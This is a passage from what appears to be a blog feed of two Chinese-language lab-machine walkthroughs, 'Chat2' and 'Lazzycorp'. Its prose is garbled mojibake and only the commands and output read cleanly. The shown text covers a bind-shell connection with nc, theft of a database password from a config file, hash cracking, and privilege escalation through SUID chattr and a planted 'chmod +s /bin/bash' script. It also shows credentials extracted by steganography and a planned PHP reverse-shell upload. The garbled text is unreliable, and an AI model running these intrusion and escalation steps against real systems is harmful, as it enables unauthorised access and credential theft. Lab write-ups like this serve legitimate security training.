&gt; **Áü•ËØÜÁÇπË°•ÂÖÖ**ÔºöËøôÊòØ‰∏ÄÁßçÂà©Áî®ËÆ°Âàí‰ªªÂä°Ëé∑ÂèñShellÁöÑÂ∏∏ËßÅÊâãÊ≥ï„ÄÇËøôÈáåÁöÑ `shell.php` ÊûÅÊúâÂèØËÉΩÊòØ‰∏Ä‰∏™Ê≠£ÂêëShellËÑöÊú¨ÔºåÂÆÉ‰ºöÂú®Ë¢´ËÆøÈóÆÊàñÊâßË°åÊó∂ÔºåÁõëÂê¨ÊúçÂä°Âô®ÁöÑÊüê‰∏™Á´ØÂè£ÔºåÁ≠âÂæÖÊîªÂáªËÄÖËøûÊé•„ÄÇ

Âà∞ËææËÆæÂÆöÁöÑÊó∂Èó¥ÁÇπÔºàxx:13ÔºâÂêéÔºåÊàë‰ª¨ÂÜçÊ¨°‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á‰∏ªÊú∫ÁöÑÁ´ØÂè£„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.153
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
12345/tcp open  netbus
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫Â§öÂºÄÊîæ‰∫Ü‰∏Ä‰∏™ `12345` Á´ØÂè£„ÄÇÊàë‰ª¨Â∞ùËØï‰ΩøÁî® `netcat (nc)` ËøûÊé•ËØ•Á´ØÂè£„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc 192.168.205.153 12345
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÊàêÂäüËøûÊé•ÔºåÂπ∂‰∏îÊâßË°å `id` ÂëΩ‰ª§ÂêéÂæóÂà∞‰∫ÜÂõûÊòæ„ÄÇËøôÊòØ‰∏Ä‰∏™ `www-data` Áî®Êà∑ÊùÉÈôêÁöÑÊ≠£ÂêëShell„ÄÇ‰∏∫‰∫Ü‰æø‰∫éÂêéÁª≠Êìç‰ΩúÔºåÊàë‰ª¨‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Â∞ÜÂÖ∂ÂçáÁ∫ß‰∏∫‰∏Ä‰∏™Á®≥ÂÆöÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

```shell
script /dev/null -c bash
# Êåâ‰∏ã Ctrl+Z Â∞ÜÂÖ∂ÊåÇËµ∑
stty raw -echo; fg
# Êåâ‰∏ãÂõûËΩ¶
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊ®™ÂêëÁßªÂä®**

## **1. Êï∞ÊçÆÂ∫ìÂá≠ÊçÆÂèëÁé∞**

ÂΩìÂâçÊàë‰ª¨ÊòØ `www-data` Áî®Êà∑ÔºåÊùÉÈôêËæÉ‰Ωé„ÄÇÈ¶ñÂÖàÔºåÊàë‰ª¨Âú®Á≥ªÁªü‰∏≠ËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÂØªÊâæÂèØ‰ª•Ê®™ÂêëÁßªÂä®Âà∞ÂÖ∂‰ªñÁî®Êà∑ÁöÑÁ∫øÁ¥¢„ÄÇÂú® `/home` ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `discuz` ÁöÑÁî®Êà∑„ÄÇ

```shell
www-data@Chat2:/var/www/html$ cd /home/
www-data@Chat2:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug  3 09:28 .
drwxr-xr-x 18 root   root   4096 Mar 18 20:37 ..
drwxr-xr-x  2 discuz discuz 4096 Aug  3 09:46 discuz
```

Áî±‰∫éËøôÊòØ‰∏Ä‰∏™CMSÂ∫îÁî®ÔºåÊï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂ÈÄöÂ∏∏ÂåÖÂê´‰∫ÜÈ´òÊùÉÈôêÁöÑÊï∞ÊçÆÂ∫ìÁî®Êà∑Âá≠ÊçÆ„ÄÇÊàë‰ª¨Âú®ÁΩëÁ´ôÊ†πÁõÆÂΩï `/var/www/html/config/` ‰∏ãÊâæÂà∞‰∫ÜÈÖçÁΩÆÊñá‰ª∂ `config_global.php`„ÄÇ

```shell
www-data@Chat2:/var/www/html/config$ cat config_global.php
...
$_config['db'][1]['dbhost'] = '127.0.0.1';
$_config['db'][1]['dbuser'] = 'discuz_user';
$_config['db'][1]['dbpw'] = 'StrongPassword!123';
...
```

## **2. Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊåñÊéò**

Êàë‰ª¨ÊâæÂà∞‰∫ÜÊï∞ÊçÆÂ∫ìÁî®Êà∑ `discuz_user` ÂíåÂØÜÁ†Å `StrongPassword!123`„ÄÇ‰ΩøÁî®ËØ•Âá≠ÊçÆËøûÊé•Êú¨Âú∞ÁöÑMariaDBÊï∞ÊçÆÂ∫ì„ÄÇ

```shell
www-data@Chat2:/var/www/html/config$ mysql -u discuz_user -p'StrongPassword!123'
...
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| discuz_db          |
| information_schema |
| mysql              |
+--------------------+
```

Âú® `discuz_db` Êï∞ÊçÆÂ∫ìÁöÑ `maze_ucenter_members` Ë°®‰∏≠ÔºåÊàë‰ª¨Âè™ÂèëÁé∞‰∫Ü‰πãÂâçÁôªÂΩïWebÂêéÂè∞ÁöÑadminÁî®Êà∑ÂìàÂ∏åÔºåËøôÂØπÊ®™ÂêëÁßªÂä®Ê≤°ÊúâÂ∏ÆÂä©„ÄÇ

‰∫éÊòØÔºåÊàë‰ª¨Â∞ÜÁõÆÂÖâËΩ¨Âêë‰∫Ü `mysql` Ëøô‰∏™Á≥ªÁªüÊï∞ÊçÆÂ∫ìÔºåÂÆÉÂ≠òÂÇ®‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑÊâÄÊúâÁî®Êà∑‰ø°ÊÅØ„ÄÇ

```shell
MariaDB [discuz_db]&gt; use mysql;
Database changed
MariaDB [mysql]&gt; select user, host, password from user;
...
```

Êü•ËØ¢ `user` Ë°®ÂêéÔºåÈô§‰∫ÜÂ∑≤Áü•ÁöÑ `discuz_user`ÔºåÊàë‰ª¨ËøòÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `hackme` ÁöÑÁî®Êà∑ÔºåÂÖ∂ÂØÜÁ†ÅÂìàÂ∏å‰∏∫ `FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2`„ÄÇËøôÊòØ‰∏Ä‰∏™MySQL 4.1ÁâàÊú¨‰πãÂâçÁöÑÊóßÊ†ºÂºèÂìàÂ∏åÔºà`mysql_old_password`Ôºâ„ÄÇ

Êàë‰ª¨‰ΩøÁî®Âú®Á∫øÂìàÂ∏åÁ†¥Ëß£ÁΩëÁ´ôÔºàÂ¶Ç crackstation.netÔºâÂØπÊ≠§ÂìàÂ∏åËøõË°åÊü•ËØ¢ÔºåÊàêÂäüÁ†¥Ëß£Âá∫ÊòéÊñáÂØÜÁ†Å‰∏∫ `root123`„ÄÇ

## **3. ÂàáÊç¢Áî®Êà∑**

Êàë‰ª¨ÁåúÊµã `hackme` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂèØËÉΩ‰∏éÁ≥ªÁªüÁî®Êà∑ `discuz` ÁöÑÂØÜÁ†ÅÁõ∏Âêå„ÄÇÂ∞ùËØï‰ΩøÁî® `su` ÂëΩ‰ª§ÂàáÊç¢Âà∞ `discuz` Áî®Êà∑ÔºåÂπ∂ËæìÂÖ•ÂØÜÁ†Å `root123`„ÄÇ

```shell
www-data@Chat2:/var/www/html/config$ su discuz
Password: root123
discuz@Chat2:/home$ id
uid=1000(discuz) gid=1000(discuz) groups=1000(discuz)
```

ÊàêÂäüÂàáÊç¢ÔºÅÊàë‰ª¨Â∑≤Áªè‰ªé `www-data` Áî®Êà∑Ê®™ÂêëÁßªÂä®Âà∞‰∫Ü `discuz` Áî®Êà∑„ÄÇ

# **Âõõ„ÄÅÊùÉÈôêÊèêÂçá**

## **1. SUIDÊèêÊùÉÂêëÈáè‰∏éÊñá‰ª∂Â±ûÊÄß**

ÁôªÂΩï `discuz` Áî®Êà∑ÂêéÔºåÊàë‰ª¨È¶ñÂÖàÊ£ÄÊü•ËØ•Áî®Êà∑Êã•ÊúâÁöÑ `sudo` ÊùÉÈôêÔºåÂêåÊó∂ÂºÄÂßãÂØªÊâæÁ≥ªÁªü‰∏äÂÖ∂‰ªñÁöÑÊèêÊùÉÂêëÈáèÔºå‰æãÂ¶ÇÊü•ÊâæÂÖ∑ÊúâSUIDÊùÉÈôê‰ΩçÁöÑ‰∫åËøõÂà∂Êñá‰ª∂„ÄÇ

```shell
# Ê£ÄÊü•sudoÊùÉÈôê
discuz@Chat2:~$ sudo -l
...
User discuz may run the following commands on Chat2:
    (ALL) NOPASSWD: /home/discuz/chat

# Êü•ÊâæÁ≥ªÁªüËåÉÂõ¥ÂÜÖÁöÑSUIDÊñá‰ª∂
discuz@Chat2:~$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
...
-rwsr-sr-x 1 root root 14336 Jan  9  2020 /usr/bin/chattr
...
```

Êàë‰ª¨ÂæóÂà∞‰∫Ü‰∏§Êù°ÂÖ≥ÈîÆ‰ø°ÊÅØÔºö

1.  `discuz` Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°åÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `chat` Á®ãÂ∫è„ÄÇËøôÊòØ‰∏Ä‰∏™ÈùûÂ∏∏Áõ¥Êé•ÁöÑÊèêÊùÉË∑ØÂæÑ„ÄÇ
2.  `/usr/bin/chattr` ÂëΩ‰ª§Ë¢´ËÆæÁΩÆ‰∫ÜSUID‰Ωç„ÄÇ

&gt; **Áü•ËØÜÁÇπË°•ÂÖÖ**ÔºöSUIDÔºàSet User IDÔºâÊòØ‰∏ÄÁßçÁâπÊÆäÁöÑÊùÉÈôê‰Ωç„ÄÇÂΩì‰∏Ä‰∏™ÂèØÊâßË°åÊñá‰ª∂ËÆæÁΩÆ‰∫ÜSUID‰ΩçÂêéÔºå‰ªª‰ΩïÁî®Êà∑Âú®ÊâßË°åÂÆÉÊó∂ÔºåËøõÁ®ãÁöÑÊúâÊïàÁî®Êà∑IDÔºàeuidÔºâÈÉΩ‰ºöÂèòÊàêÊñá‰ª∂ÊâÄÊúâËÄÖÁöÑID„ÄÇ`chattr` ÁöÑÊâÄÊúâËÄÖÊòØrootÔºåÂõ†Ê≠§Êàë‰ª¨Áé∞Âú®ÂèØ‰ª•‰ª•rootÊùÉÈôêÊù•ÊâßË°å `chattr` ÂëΩ‰ª§„ÄÇ

Êàë‰ª¨ÁöÑ‰∏ªË¶ÅÊîªÂáªÊÄùË∑ØÊòØÊõøÊç¢ `/home/discuz/chat` Êñá‰ª∂‰∏∫‰∏Ä‰∏™ÊÅ∂ÊÑèËÑöÊú¨ÔºåÁÑ∂ÂêéÈÄöËøá `sudo` ÊâßË°åÂÆÉÊù•ÊèêÊùÉ„ÄÇÁÑ∂ËÄåÔºåÂΩìÊàë‰ª¨Â∞ùËØïÈáçÂëΩÂêçÊàñÂà†Èô§ËØ•Êñá‰ª∂Êó∂ÔºåÂç¥ÈÅ≠Âà∞‰∫ÜÊãíÁªù„ÄÇ

```shell
discuz@Chat2:~$ mv chat chat.bak
mv: cannot move 'chat' to 'chat.bak': Operation not permitted
```

Ëøô‰∏™Áé∞Ë±°Âæà‰∏çÂØªÂ∏∏ÔºåÂõ†‰∏∫Êàë‰ª¨‰Ωú‰∏∫ `discuz` Áî®Êà∑ÔºåÂØπËá™Â∑±ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂Â∫îËØ•ÊúâÂÜôÊùÉÈôê„ÄÇËøôÈÄöÂ∏∏ÊÑèÂë≥ÁùÄÊñá‰ª∂Ë¢´ËÆæÁΩÆ‰∫ÜÁâπÊÆäÁöÑÊâ©Â±ïÂ±ûÊÄß„ÄÇÊàë‰ª¨‰ΩøÁî® `lsattr` ÂëΩ‰ª§Êù•È™åËØÅÁåúÊÉ≥„ÄÇ

```shell
discuz@Chat2:~$ lsattr /home/discuz/chat
----i---------e---- /home/discuz/chat
```

&gt; **Áü•ËØÜÁÇπË°•ÂÖÖ**Ôºö`lsattr` ÂëΩ‰ª§Áî®‰∫éÊü•ÁúãÊñá‰ª∂ÁöÑÊâ©Â±ïÂ±ûÊÄß„ÄÇËøôÈáåÁöÑ `i` Â±ûÊÄßÔºàimmutableÔºâÊÑèÂë≥ÁùÄËØ•Êñá‰ª∂Ë¢´‚ÄúÈîÅÂÆö‚ÄùÔºåÂç≥‰æøÊòØrootÁî®Êà∑‰πüÊó†Ê≥ï‰øÆÊîπ„ÄÅÂà†Èô§„ÄÅÈáçÂëΩÂêçÊàñÂàõÂª∫ÈìæÊé•„ÄÇ

Áé∞Âú®Ôºå‰∏§Êù°Á∫øÁ¥¢ÂÆåÁæéÂú∞ÁªìÂêàÂú®‰∫Ü‰∏ÄËµ∑Ôºö`chat` Êñá‰ª∂Âõ†‰∏∫ `i` Â±ûÊÄßËÄåÊó†Ê≥ïË¢´‰øÆÊîπÔºåËÄåÊàë‰ª¨ÊÅ∞Â•ΩÊã•Êúâ‰∏Ä‰∏™Â∏¶SUIDÁöÑ `chattr` ÂëΩ‰ª§ÔºåÂèØ‰ª•Áî®ÂÆÉÊù•ÁßªÈô§Ëøô‰∏™ `i` Â±ûÊÄß„ÄÇ

## **2. ÊõøÊç¢Êñá‰ª∂Âπ∂ÊèêÊùÉ**

ÊèêÊùÉÊÄùË∑ØÂ∑≤ÁªèÊ∏ÖÊô∞Ôºö

1.  Âà©Áî®Â∏¶SUIDÁöÑ `/usr/bin/chattr` ÁßªÈô§ `/home/discuz/chat` ÁöÑ `i` Â±ûÊÄß„ÄÇ
2.  Â∞Ü `/home/discuz/chat` ÊõøÊç¢‰∏∫Êàë‰ª¨Ëá™Â∑±ÁöÑÊÅ∂ÊÑèËÑöÊú¨„ÄÇ
3.  ÈÄöËøá `sudo` ÊâßË°å‰øÆÊîπÂêéÁöÑ `chat` ËÑöÊú¨Ôºå‰ª•rootÊùÉÈôêÂÆåÊàêÊèêÊùÉ„ÄÇ

Êàë‰ª¨ÊûÑÈÄ†ÁöÑÊÅ∂ÊÑèËÑöÊú¨ÂäüËÉΩÊòØ‰∏∫ `/bin/bash` Ê∑ªÂä†SUIDÊùÉÈôê‰ΩçÔºåËøôÊ†∑Êàë‰ª¨Â∞±ËÉΩÈöèÊó∂ÈÄöËøá `bash -p` Ëé∑Âèñ‰∏Ä‰∏™root shell„ÄÇ

ÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Ôºö

```shell
# 1. Âà©Áî®SUID chattrÁßªÈô§ i Â±ûÊÄß
discuz@Chat2:~$ /usr/bin/chattr -i /home/discuz/chat

# 2. Â§á‰ªΩÂéüÊñá‰ª∂Âπ∂ÂàõÂª∫ÊÅ∂ÊÑèËÑöÊú¨
discuz@Chat2:~$ mv chat chat.bak
discuz@Chat2:~$ echo 'chmod +s /bin/bash' &gt; chat
discuz@Chat2:~$ chmod +x chat

# 3. Ê£ÄÊü• /bin/bash ÂΩìÂâçÊùÉÈôê
discuz@Chat2:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash

# 4. ‰ΩøÁî®sudoÊâßË°åÊàë‰ª¨ÁöÑËÑöÊú¨
discuz@Chat2:~$ sudo /home/discuz/chat

# 5. ÂÜçÊ¨°Ê£ÄÊü• /bin/bash ÊùÉÈôêÔºåÁ°ÆËÆ§SUID‰ΩçÂ∑≤Ê∑ªÂä†
discuz@Chat2:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

ÂèØ‰ª•ÁúãÂà∞ `/bin/bash` Â∑≤ÁªèÊã•Êúâ‰∫Ü `rws` ÊùÉÈôêÔºåSUID‰ΩçËÆæÁΩÆÊàêÂäü„ÄÇ

## **3. Ëé∑ÂèñRoot Shell**

ÊúÄÂêéÔºåÊâßË°å `bash -p` ÂëΩ‰ª§ÔºåÂà©Áî®SUIDÊùÉÈôêËé∑Âæó‰∏Ä‰∏™ euid ‰∏∫ 0 (root) ÁöÑshell„ÄÇ

```shell
discuz@Chat2:~$ bash -p
bash-5.0# id
uid=1000(discuz) gid=1000(discuz) euid=0(root) egid=0(root) groups=0(root),1000(discuz)
```

&gt; **Áü•ËØÜÁÇπË°•ÂÖÖ**Ôºö`bash -p` ‰∏≠ÁöÑ `-p` ÂèÇÊï∞ÂëäËØâbash‰∏çË¶ÅÂ∞ÜÊúâÊïàÁî®Êà∑IDÔºàeuidÔºâÈáçÁΩÆ‰∏∫ÂÆûÈôÖÁî®Êà∑IDÔºàuidÔºâ„ÄÇÂ¶ÇÊûú‰∏Ä‰∏™ÂèØÊâßË°åÊñá‰ª∂ÔºàÂ¶ÇbashÔºâËÆæÁΩÆ‰∫ÜSUID‰ΩçÔºåÊôÆÈÄöÁî®Êà∑ÊâßË°åÂÆÉÊó∂ÔºåËøõÁ®ãÁöÑeuid‰ºöÂèòÊàêÊñá‰ª∂ÊâÄÊúâËÄÖÔºàrootÔºâÁöÑID„ÄÇ`-p` ÂèÇÊï∞‰øùÁïô‰∫ÜËøô‰∏™ÊèêÊùÉÂêéÁöÑeuidÔºå‰ªéËÄåËÆ©Êàë‰ª¨Ëé∑ÂæórootÊùÉÈôêÁöÑshell„ÄÇ

# **‰∫î„ÄÅÂ§∫ÂèñÂá≠ËØÅ**

ÊàêÂäüËé∑ÂèñrootÊùÉÈôêÂêéÔºåÊàë‰ª¨ËØªÂèñ‰Ωç‰∫éÁî®Êà∑ÁõÆÂΩïÂíårootÁõÆÂΩï‰∏ãÁöÑflagÊñá‰ª∂„ÄÇ

```shell
bash-5.0# cat /home/discuz/user.txt /root/root.txt
flag{user-41352be6a84e5910fdef6afec4e41617}
flag{root-099177104a7291ba00f83ab188987c5d}
```

ÊàêÂäüËé∑ÂèñÊâÄÊúâflagÔºåÊ∏óÈÄèÊµãËØïÁªìÊùü„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html</guid><pubDate>Thu, 21 Aug 2025 02:27:36 +0000</pubDate></item><item><title>hmv_Lazzycorp</title><link>https://7r1UMPHK.github.io/post/hmv_Lazzycorp.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®ÂΩìÂâçÁΩëÊÆµÂÜÖËøõË°å‰∏ªÊú∫ÂèëÁé∞Ôºå‰ª•Á°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇËøôÈáåÊàë‰ª¨‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:ea:8b:bc       (Unknown)
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.149`„ÄÇ

## **Á´ØÂè£Êâ´Êèè**

Á°ÆËÆ§ÁõÆÊ†áIPÂêéÔºå‰ΩøÁî®`nmap`ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÁõÆÊ†á‰∏ªÊú∫‰∏äÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:26 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:8B:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

Êâ´ÊèèÂèëÁé∞ÂºÄÊîæ‰∫Ü‰∏â‰∏™ÂÖ≥ÈîÆÁ´ØÂè£Ôºö21 (FTP), 22 (SSH), Âíå 80 (HTTP)„ÄÇ

## **FTPÊúçÂä°Êé¢Êµã**

FTPÊúçÂä°ÈÄöÂ∏∏ÂèØËÉΩÂ≠òÂú®ÂåøÂêçËÆøÈóÆÊºèÊ¥û„ÄÇÂ∞ùËØï‰ΩøÁî®`anonymous`‰Ωú‰∏∫Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅËøõË°åÁôªÂΩï„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ lftp 192.168.205.149 -u anonymous
ÂØÜÁ†Å: anonymous
lftp anonymous@192.168.205.149:~&gt; ls -al
...
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
lftp anonymous@192.168.205.149:/&gt; cd pub/
lftp anonymous@192.168.205.149:/pub&gt; ls -al
...
-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
lftp anonymous@192.168.205.149:/pub&gt; get note.jpg
1366786 bytes transferred
```

ÊàêÂäüÁôªÂΩïÂπ∂ÂèëÁé∞ `/pub` ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™Âêç‰∏∫ `note.jpg` ÁöÑÊñá‰ª∂ÔºåÂ∞ÜÂÖ∂‰∏ãËΩΩÂà∞Êú¨Âú∞„ÄÇ

## **WebÁõÆÂΩïÊâ´Êèè**

Âú®ÂàÜÊûêFTPÊñá‰ª∂ÁöÑÂêåÊó∂ÔºåÂØπWebÊúçÂä°ËøõË°åÁõÆÂΩïÊâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ dirsearch -u http://192.168.205.149/
...
[10:29:21] 301 -  317B  - /blog  -&gt;  http://192.168.205.149/blog/
[10:29:32] 200 -   55B  - /robots.txt
[10:29:36] 301 -  320B  - /uploads  -&gt;  http://192.168.205.149/uploads/
...
```

È¶ñÂÖàÊü•Áúã `robots.txt` Êñá‰ª∂ÔºåÂÆÉÈÄöÂ∏∏‰ºöÊ≥ÑÈú≤‰∏Ä‰∫õÂêéÂè∞Ë∑ØÂæÑ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.149/robots.txt
Disallow: /cms-admin.php
Disallow: /auth-LazyCorp-dev/
```

`robots.txt` Êñá‰ª∂Ê≥ÑÈú≤‰∫Ü‰∏§‰∏™Ë∑ØÂæÑ„ÄÇÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåLinuxÁ≥ªÁªü‰∏äÁöÑWebÊúçÂä°Âô®Ë∑ØÂæÑÈÄöÂ∏∏ÊòØÂ§ßÂ∞èÂÜôÊïèÊÑüÁöÑ„ÄÇÂ∞ùËØïËÆøÈóÆ `robots.txt` ‰∏≠ÁªôÂá∫ÁöÑ `/auth-LazyCorp-dev/`ÔºàÈ¶ñÂ≠óÊØçÂ§ßÂÜôÔºâËøîÂõû404 Not FoundÔºå‰ΩÜÂ∞ùËØïÂÖ∂Â∞èÂÜôÁâàÊú¨ `/auth-lazycorp-dev/` Êó∂ÔºåÊúçÂä°Âô®ËøîÂõû‰∫Ü `403 Forbidden` ÈîôËØØ„ÄÇËøô‰∏™ `403` ÈîôËØØÁ†ÅË°®ÊòéËØ•ÁõÆÂΩïÁ°ÆÂÆûÂ≠òÂú®ÔºåÂè™ÊòØÊàë‰ª¨Ê≤°ÊúâÊùÉÈôêÁõ¥Êé•ËÆøÈóÆÊàñÂàóÂá∫ÂÖ∂ÂÜÖÂÆπ„ÄÇ

Ëøô‰∏™ÂèëÁé∞Ëá≥ÂÖ≥ÈáçË¶ÅÔºåÂÆÉ‰∏∫Êàë‰ª¨ÊåáÊòé‰∫Ü‰∏ã‰∏ÄÊ≠•ÁöÑÊñπÂêëÔºöÂØπËøô‰∏™Â∑≤Á°ÆËÆ§Â≠òÂú®ÁöÑ `/auth-lazycorp-dev/` ÁõÆÂΩïËøõË°åÊ∑±Â∫¶ÁàÜÁ†¥Ôºå‰ª•ÂèëÁé∞ÂÖ∂‰∏≠ÈöêËóèÁöÑÂèØËÆøÈóÆÊñá‰ª∂„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.149/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
...
/login.php            (Status: 200) [Size: 710]
/uploads              (Status: 301) [Size: 338] [--&gt; http://192.168.205.149/auth-lazycorp-dev/uploads/]
/dashboard.php        (Status: 302) [Size: 0] [--&gt; login.php]
...
```

ÁàÜÁ†¥ÊàêÂäüÔºåÊâæÂà∞‰∫ÜÁôªÂΩïÈ°µÈù¢ `login.php` ÂíåÊñá‰ª∂‰∏ä‰º†ÁõÆÂΩï `uploads`„ÄÇ

ÂêåÊó∂ÔºåÂØπWebÊúçÂä°ÁöÑÊ†πÁõÆÂΩïËøõË°åÊâ´Êèè‰πüÂèëÁé∞‰∫Ü `/blog` ÁõÆÂΩïÔºåÂÖ∂‰∏≠ÁöÑÊñáÁ´†ÂåÖÂê´ÈáçË¶ÅÁ∫øÁ¥¢Ôºö
1.  `DevLog #1`: ÊèêÂà∞ArvindÂ∞ÜÂá≠ËØÅÈöêËóèÂú®‰∏Ä‰∏™ÂõæÁâáÊñá‰ª∂‰∏≠ÂèëÈÄÅÁªô‰∫ÜDev„ÄÇËøô‰∏éÊàë‰ª¨Âú®FTP‰∏≠ÂèëÁé∞ÁöÑ`note.jpg`Êñá‰ª∂Áõ∏ÂêªÂêà„ÄÇ
2.  `DevLog #3`: ÊèêÂà∞‰∏Ä‰∏™‰Ωç‰∫é `/usr/local/bin/` ‰∏ãÁöÑÈáçÁΩÆËÑöÊú¨„ÄÇËøôÊòØÂêéÁª≠ÊèêÊùÉÁöÑÂÖ≥ÈîÆ‰ø°ÊÅØ„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®**

## **ÂõæÁâáÈöêÂÜôÊúØËé∑ÂèñÂá≠ËØÅ**

`DevLog #1` Âº∫ÁÉàÊöóÁ§∫ `note.jpg` Êñá‰ª∂‰∏≠Âê´ÊúâÂá≠ËØÅ„ÄÇÊàë‰ª¨‰ΩøÁî® `stegseek` Â∑•ÂÖ∑ËøõË°åÂàÜÊûê„ÄÇ`stegseek` ÊòØ‰∏ÄÊ¨æÈ´òÈÄüÁöÑÈöêÂÜôÁ†¥Ëß£Â∑•ÂÖ∑ÔºåÂèØ‰ª•ÊúâÊïàÂú∞Ê£ÄÊµãÂíåÊèêÂèñ`steghide`ÈöêËóèÁöÑÊï∞ÊçÆ„ÄÇ

```shell
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ''
[i] Original filename: 'creds.txt'.
[i] Extracting to 'note.jpg.out'.

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat note.jpg.out
Username: dev
Password: d3v3l0pm3nt!nt3rn
```

ÊàêÂäü‰ªéÂõæÁâá‰∏≠ÊèêÂèñÂá∫ÈöêËóèÁöÑÂá≠ËØÅ„ÄÇ

## **ÂêéÂè∞Êñá‰ª∂‰∏ä‰º†Getshell**

Âà©Áî®ÂàöÂàöËé∑ÂèñÁöÑÂá≠ËØÅ `dev:d3v3l0pm3nt!nt3rn` ÁôªÂΩï‰πãÂâçÂèëÁé∞ÁöÑÂêéÂè∞Âú∞ÂùÄ `http://192.168.205.149/auth-lazycorp-dev/login.php`„ÄÇ

ÁôªÂΩïÂêéÔºåÂèëÁé∞‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†ÂäüËÉΩ„ÄÇÁªìÂêà‰πãÂâçÁàÜÁ†¥Âá∫ÁöÑ `/uploads` ÁõÆÂΩïÔºåÊàë‰ª¨ÂèØ‰ª•‰∏ä‰º†‰∏Ä‰∏™PHPÂèçÂêëshellÊù•Ëé∑ÂèñÊúçÂä°Âô®ÁöÑÊéßÂà∂ÊùÉ„ÄÇ

1.  Âú®Êú¨Âú∞ÂáÜÂ§á‰∏Ä‰∏™PHPÂèçÂêëshellÔºà‰æãÂ¶Ç `reverse.php`Ôºâ„ÄÇ
2.  ÈÄöËøáÂêéÂè∞‰∏ä‰º†ËØ•Êñá‰ª∂„ÄÇ
3.  Âú®Kali‰∏ä‰ΩøÁî® `netcat` ÁõëÂê¨ÊåáÂÆöÁ´ØÂè£„ÄÇ
    ```shell
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
